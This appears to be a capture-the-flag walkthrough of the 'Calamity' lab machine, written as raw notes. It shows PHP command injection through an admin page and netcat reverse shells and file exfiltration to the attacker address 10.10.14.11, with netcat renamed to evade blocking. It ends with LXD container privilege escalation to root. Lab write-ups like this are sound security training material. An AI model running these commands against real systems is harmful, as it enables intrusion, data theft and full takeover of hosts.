**By: curl -v http://10.10.10.27/admin.php  
Account find:  
admin   
skoupidotenekes**  
**For POC:**   
```shell
<?php system('ls -lah') ?>
Permission denied:
<?php exec('wget http://10.10.14.11/revshell.php') ?>
```
**Try but fail by VM setting:**
```shell
<?php system('rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.11 1234 >/tmp/f') ?>
Check useful information:
<?php system('ls -lah /home/xalvas') ?>
<?php system('cat /home/xalvas/intrusions') ?> 
```
**COPY nc Method:**
```shell
<?php system('which nc') ?>

<?php system('cp /bin/nc /dev/shm/harmless') ?> 
<?php system('chmod +x /dev/shm/harmless') ?>
<?php system('rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|/dev/shm/harmless 10.10.14.11 1234 >/tmp/f') ?>
```
Try copy out to listen(TBC as CTF style):
--------------------------------------------------------
```shell
/home/xalvas/recov.wav -> recov.wav

As nc blocked,
cp /bin/nc ~/nba
Kali: nc  -l -p 9090 > recov.wav
Remote:./nba -w3 10.10.14.11 9090 < recov.wav
```
--------------------------------------------------------

Then know "xalvas" password and login SSH:
18547936..*
Kail:
```shell
git clone https://github.com/saghul/lxd-alpine-builder.git
./build-alpine -a i686
```
#### SCP via SSH:
```shell
scp alpine-v3.9-i386-20190523_1714.tar.gz  xalvas@10.10.10.27:/tmp/
Password: 18547936..*
```
**Calamity:
```shell
xalvas@calamity:/tmp$ lxc image import alpine-v3.9-i386-20190523_1714.tar.gz --alias alpine
Image imported with fingerprint: 8e6c7cb2b5f1d8c52d8a4912c485984414a2e6954ce46c7f08b6a4e99caae6aa

xalvas@calamity:/tmp$ lxc init alpine alexcold -c security.privileged=true
Creating alexcold

xalvas@calamity:/tmp$ lxc config device add alexcold somedisk disk source=/ path=/mnt/root recursive=true
Device somedisk added to alexcold

Then start the docker:
xalvas@calamity:/tmp$ lxc start alexcold

xalvas@calamity:/tmp$ lxc exec alexcold --mode=interactive /bin/sh
~ # id
uid=0(root) gid=0(root)
~ # ls -la
total 12
drwx------    2 root     root          4096 May 23 09:36 .
drwxr-xr-x   19 root     root          4096 May 23 09:34 ..
-rw-------    1 root     root            10 May 23 09:36 .ash_history
~ # cd /mnt/root/root
/mnt/root/root # ls
peda      root.txt  scr
/mnt/root/root # cat root.txt
9be653e014d17d1a54f9045e3220743c
```
